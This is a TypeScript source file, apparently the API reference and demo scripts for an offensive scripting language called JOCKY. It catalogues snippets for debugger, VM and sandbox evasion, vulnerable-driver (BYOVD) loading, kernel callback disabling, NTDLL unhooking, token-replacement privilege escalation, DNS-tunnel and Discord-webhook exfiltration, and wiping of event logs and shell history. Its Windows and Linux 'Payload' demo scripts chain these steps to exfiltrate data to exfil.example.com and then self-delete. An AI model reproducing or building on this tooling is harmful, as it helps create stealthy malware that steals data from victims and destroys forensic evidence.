import type { ApiCategory, ObfuscationState } from './types';

export const runtimeApis: ApiCategory[] = [
  {
    name: 'Anti-Analysis',
    platform: 'both',
    apis: [
      {
        name: 'check_analysis_environment',
        description: 'Detect analysis tools and debuggers',
        snippet: `let analysis_detected: bool = check_analysis_environment()
if analysis_detected {
    println("Analysis environment detected")
}`,
      },
      {
        name: 'is_debugger_present',
        description: 'Check if a debugger is attached',
        snippet: `let debugger_present: bool = is_debugger_present()
if debugger_present {
    println("Debugger detected - exiting")
}`,
      },
      {
        name: 'is_vm',
        description: 'Detect virtual machine environment',
        snippet: `let in_vm: bool = is_vm()
if in_vm {
    println("Running inside a virtual machine")
}`,
      },
      {
        name: 'is_sandbox',
        description: 'Detect sandbox environment',
        snippet: `let sandboxed: bool = is_sandbox()
if sandboxed {
    println("Sandbox environment detected")
}`,
      },
      {
        name: 'sleep_and_recheck',
        description: 'Sleep then recheck for analysis',
        snippet: `sleep_and_recheck(5000)
println("Recheck complete")`,
      },
    ],
  },
  {
    name: 'Crypto',
    platform: 'both',
    apis: [
      {
        name: 'generate_key',
        description: 'Generate a cryptographic key',
        snippet: `let key: [u8; 32] = generate_key(256)
println("Key generated successfully")`,
      },
      {
        name: 'aes256_encrypt',
        description: 'Encrypt data with AES-256',
        snippet: `let plaintext: str = "sensitive data"
let key: [u8; 32] = generate_key(256)
let ciphertext: [u8] = aes256_encrypt(plaintext, key)
println("Data encrypted")`,
      },
    ],
  },
  {
    name: 'Exfiltration',
    platform: 'both',
    apis: [
      {
        name: 'dns_tunnel',
        description: 'Exfiltrate data via DNS tunneling',
        snippet: `let data: str = "exfil payload"
let result: i32 = dns_tunnel(data, "tunnel.example.com")
if result == 0 {
    println("DNS tunnel exfil complete")
}`,
      },
      {
        name: 'discord_webhook',
        description: 'Send data via Discord webhook',
        snippet: `let webhook_url: str = "https://discord.com/api/webhooks/..."
let payload: str = "collected data"
let status: i32 = discord_webhook(webhook_url, payload)
println("Webhook sent")`,
      },
      {
        name: 'local_cdn',
        description: 'Stage data to local CDN endpoint',
        snippet: `let data: str = "staged payload"
let cdn_result: i32 = local_cdn(data, "/cdn/drop")
if cdn_result == 0 {
    println("Data staged to CDN")
}`,
      },
    ],
  },
  {
    name: 'AI/ML',
    platform: 'both',
    apis: [
      {
        name: 'ai_init',
        description: 'Initialize AI/ML model',
        snippet: `let model_status: i32 = ai_init("threat_model_v2")
if model_status == 0 {
    println("AI model initialized")
}`,
      },
      {
        name: 'ai_collect_telemetry',
        description: 'Collect system telemetry for AI',
        snippet: `let telemetry: [u8] = ai_collect_telemetry()
println("Telemetry collected")`,
      },
      {
        name: 'ai_score_threat',
        description: 'Score threat level with ML model',
        snippet: `let telemetry: [u8] = ai_collect_telemetry()
let threat_score: f64 = ai_score_threat(telemetry)
println("Threat score: " + str(threat_score))`,
      },
    ],
  },
  {
    name: 'Sandbox',
    platform: 'both',
    apis: [
      {
        name: 'spawn',
        description: 'Spawn a sandboxed process',
        snippet: `let sandbox_id: i32 = sandbox_spawn("/bin/target", "rw")
if sandbox_id >= 0 {
    println("Sandbox spawned: " + str(sandbox_id))
}`,
      },
      {
        name: 'set_limits',
        description: 'Set sandbox resource limits',
        snippet: `sandbox_set_limits(sandbox_id, 1024, 60, 10)
println("Sandbox limits configured")`,
      },
      {
        name: 'monitor',
        description: 'Monitor sandbox execution',
        snippet: `let events: [u8] = sandbox_monitor(sandbox_id)
println("Monitoring sandbox activity")`,
      },
      {
        name: 'wait',
        description: 'Wait for sandbox to complete',
        snippet: `let exit_code: i32 = sandbox_wait(sandbox_id, 30000)
println("Sandbox exited with: " + str(exit_code))`,
      },
      {
        name: 'export_trace',
        description: 'Export sandbox execution trace',
        snippet: `let trace: str = sandbox_export_trace(sandbox_id)
println("Trace exported")`,
      },
    ],
  },
  {
    name: 'Plugin',
    platform: 'both',
    apis: [
      {
        name: 'load',
        description: 'Load a plugin module',
        snippet: `let plugin_id: i32 = plugin_load("scanner_plugin.so")
if plugin_id >= 0 {
    println("Plugin loaded: " + str(plugin_id))
}`,
      },
      {
        name: 'run',
        description: 'Execute a loaded plugin',
        snippet: `let result: i32 = plugin_run(plugin_id, "scan")
println("Plugin result: " + str(result))`,
      },
    ],
  },
  {
    name: 'Audit',
    platform: 'both',
    apis: [
      {
        name: 'init',
        description: 'Initialize audit logging',
        snippet: `let audit: i32 = audit_init("/var/log/jocky_audit.log")
if audit == 0 {
    println("Audit initialized")
}`,
      },
      {
        name: 'log',
        description: 'Write an audit log entry',
        snippet: `audit_log("OPERATION", "Description of action performed")
println("Audit entry written")`,
      },
      {
        name: 'verify',
        description: 'Verify audit log integrity',
        snippet: `let valid: bool = audit_verify()
if valid {
    println("Audit log integrity verified")
}`,
      },
      {
        name: 'export',
        description: 'Export audit logs',
        snippet: `let export_path: str = audit_export("/tmp/audit_export.json")
println("Audit exported to: " + export_path)`,
      },
    ],
  },
  {
    name: 'BYOVD',
    platform: 'windows',
    apis: [
      {
        name: 'load_driver',
        description: 'Load a vulnerable driver',
        snippet: `let driver_status: i32 = byovd_load_driver("C:\\\\drivers\\\\vuln.sys", "VulnDriver")
if driver_status == 0 {
    println("Driver loaded successfully")
}`,
      },
      {
        name: 'test_exploit',
        description: 'Test driver exploitation',
        snippet: `let exploit_result: i32 = byovd_test_exploit("VulnDriver", "read_msr")
if exploit_result == 0 {
    println("Exploit chain viable")
}`,
      },
      {
        name: 'mask_module',
        description: 'Mask a loaded kernel module',
        snippet: `let mask_result: i32 = byovd_mask_module("TargetModule")
if mask_result == 0 {
    println("Module masked from enumeration")
}`,
      },
      {
        name: 'disable_notifications',
        description: 'Disable kernel notifications',
        snippet: `let notif_result: i32 = byovd_disable_notifications()
if notif_result == 0 {
    println("Kernel notifications disabled")
}`,
      },
    ],
  },
  {
    name: 'Evasion',
    platform: 'windows',
    apis: [
      {
        name: 'unhook_ntdll',
        description: 'Unhook NTDLL syscall stubs',
        snippet: `let unhook_status: i32 = unhook_ntdll()
if unhook_status == 0 {
    println("NTDLL syscall stubs restored")
}`,
      },
      {
        name: 'edrhoker_detect',
        description: 'Detect EDR hooking',
        snippet: `let hooked_count: i32 = edrhoker_detect()
println("Detected " + str(hooked_count) + " hooked functions")`,
      },
    ],
  },
  {
    name: 'Registry',
    platform: 'windows',
    apis: [
      {
        name: 'create_key',
        description: 'Create a registry key',
        snippet: `let hkey: i64 = reg_create_key("HKLM\\\\SOFTWARE\\\\JockyApp")
if hkey != 0 {
    println("Registry key created")
}`,
      },
      {
        name: 'set_value',
        description: 'Set a registry value',
        snippet: `let set_result: i32 = reg_set_value(hkey, "Config", "enabled")
if set_result == 0 {
    println("Registry value set")
}`,
      },
      {
        name: 'close_key',
        description: 'Close a registry key handle',
        snippet: `reg_close_key(hkey)
println("Registry key closed")`,
      },
    ],
  },
  {
    name: 'Forensics (Win)',
    platform: 'windows',
    apis: [
      {
        name: 'wipe_powershell',
        description: 'Clear PowerShell command history',
        snippet: `let wipe_result: i32 = forensics_wipe_powershell()
if wipe_result == 0 {
    println("PowerShell history cleared")
}`,
      },
      {
        name: 'wipe_cmd',
        description: 'Clear CMD command history',
        snippet: `let wipe_result: i32 = forensics_wipe_cmd()
if wipe_result == 0 {
    println("CMD history cleared")
}`,
      },
      {
        name: 'clear_dns',
        description: 'Flush DNS resolver cache',
        snippet: `let dns_result: i32 = forensics_clear_dns()
if dns_result == 0 {
    println("DNS cache flushed")
}`,
      },
      {
        name: 'flush_arp',
        description: 'Flush ARP table',
        snippet: `let arp_result: i32 = forensics_flush_arp()
if arp_result == 0 {
    println("ARP table flushed")
}`,
      },
      {
        name: 'cleanup_event_logs',
        description: 'Clean Windows Event Logs',
        snippet: `let cleanup_result: i32 = forensics_cleanup_event_logs()
if cleanup_result == 0 {
    println("Event logs cleaned")
}`,
      },
      {
        name: 'cleanup_usn',
        description: 'Clear USN journal',
        snippet: `let usn_result: i32 = forensics_cleanup_usn("C:")
if usn_result == 0 {
    println("USN journal cleared")
}`,
      },
      {
        name: 'self_delete',
        description: 'Self-delete the running binary',
        snippet: `forensics_self_delete()`,
      },
    ],
  },
  {
    name: 'Exploitation',
    platform: 'windows',
    apis: [
      {
        name: 'token_replacement',
        description: 'Replace process token for privilege escalation',
        snippet: `let token_result: i32 = exploit_token_replacement(target_pid)
if token_result == 0 {
    println("Token replacement successful")
}`,
      },
      {
        name: 'disable_callbacks',
        description: 'Disable kernel callbacks',
        snippet: `let cb_result: i32 = exploit_disable_callbacks()
if cb_result == 0 {
    println("Kernel callbacks disabled")
}`,
      },
    ],
  },
  {
    name: 'Forensics (Linux)',
    platform: 'linux',
    apis: [
      {
        name: 'wipe_bash_history',
        description: 'Clear bash command history',
        snippet: `let wipe_result: i32 = forensics_wipe_bash_history()
if wipe_result == 0 {
    println("Bash history cleared")
}`,
      },
      {
        name: 'cleanup_journal',
        description: 'Clear systemd journal logs',
        snippet: `let journal_result: i32 = forensics_cleanup_journal()
if journal_result == 0 {
    println("Journal logs cleaned")
}`,
      },
      {
        name: 'cleanup_syslog',
        description: 'Clear syslog entries',
        snippet: `let syslog_result: i32 = forensics_cleanup_syslog()
if syslog_result == 0 {
    println("Syslog entries cleared")
}`,
      },
    ],
  },
];

export const defaultObfuscation: ObfuscationState = {
  mlir: [
    { id: 'string_encrypt', name: 'String Encrypt', description: 'Encrypts string constants in MLIR', enabled: false },
    { id: 'constant_obfuscate', name: 'Constant Obfuscate', description: 'Obfuscates numeric constants', enabled: false },
    { id: 'symbol_obfuscate', name: 'Symbol Obfuscate', description: 'Renames symbols to random identifiers', enabled: false },
  ],
  llvm: [
    { id: 'bogus_cf', name: 'Bogus Control Flow', description: 'Inserts fake control flow paths', enabled: false },
    { id: 'cf_flatten', name: 'Control Flow Flattening', description: 'Flattens function control flow into switch-based dispatch', enabled: false },
    { id: 'insn_sub', name: 'Instruction Substitution', description: 'Replaces instructions with equivalent complex sequences', enabled: false },
    { id: 'bb_split', name: 'Basic Block Splitting', description: 'Splits basic blocks into smaller fragments', enabled: false },
    { id: 'indirect_calls', name: 'Indirect Calls', description: 'Replaces direct calls with indirect function pointers', enabled: false },
    { id: 'strip_sigs', name: 'Strip Signatures', description: 'Removes function signature metadata', enabled: false },
  ],
};

export const windowsDemoScript = `fn main() -> i32 {
    println("JOCKY - Windows Payload")

    if is_debugger_present() {
        println("Debugger detected - aborting")
        return 1
    }

    if is_vm() || is_sandbox() {
        sleep_and_recheck(5000)
    }

    let key: [u8; 32] = generate_key(256)
    let payload: str = "sensitive operation data"
    let encrypted: [u8] = aes256_encrypt(payload, key)

    let driver_status: i32 = byovd_load_driver("C:\\\\drivers\\\\vuln.sys", "VulnDriver")
    if driver_status == 0 {
        println("Driver loaded - escalating privileges")
        let token_result: i32 = exploit_token_replacement(4)
        if token_result == 0 {
            println("Privilege escalation complete")
        }
    }

    let unhook: i32 = unhook_ntdll()
    println("NTDLL restored: " + str(unhook))

    let result: i32 = dns_tunnel(str(encrypted), "exfil.example.com")
    println("Exfil status: " + str(result))

    forensics_cleanup_event_logs()
    forensics_self_delete()

    return 0
}`;

export const linuxDemoScript = `fn main() -> i32 {
    println("JOCKY - Linux Payload")

    if check_analysis_environment() {
        println("Analysis environment detected - aborting")
        return 1
    }

    let key: [u8; 32] = generate_key(256)
    let data: str = "collected system telemetry"
    let encrypted: [u8] = aes256_encrypt(data, key)

    let model_status: i32 = ai_init("threat_model_v2")
    if model_status == 0 {
        let telemetry: [u8] = ai_collect_telemetry()
        let score: f64 = ai_score_threat(telemetry)
        println("Threat score: " + str(score))
    }

    let audit: i32 = audit_init("/var/log/jocky_audit.log")
    audit_log("INIT", "Payload execution started")

    let sandbox_id: i32 = sandbox_spawn("/usr/bin/target", "rw")
    sandbox_set_limits(sandbox_id, 1024, 60, 10)
    let exit_code: i32 = sandbox_wait(sandbox_id, 30000)
    println("Sandbox result: " + str(exit_code))

    let exfil_result: i32 = discord_webhook(
        "https://discord.com/api/webhooks/...",
        str(encrypted)
    )
    println("Exfil status: " + str(exfil_result))

    forensics_wipe_bash_history()
    forensics_cleanup_journal()

    return 0
}`;
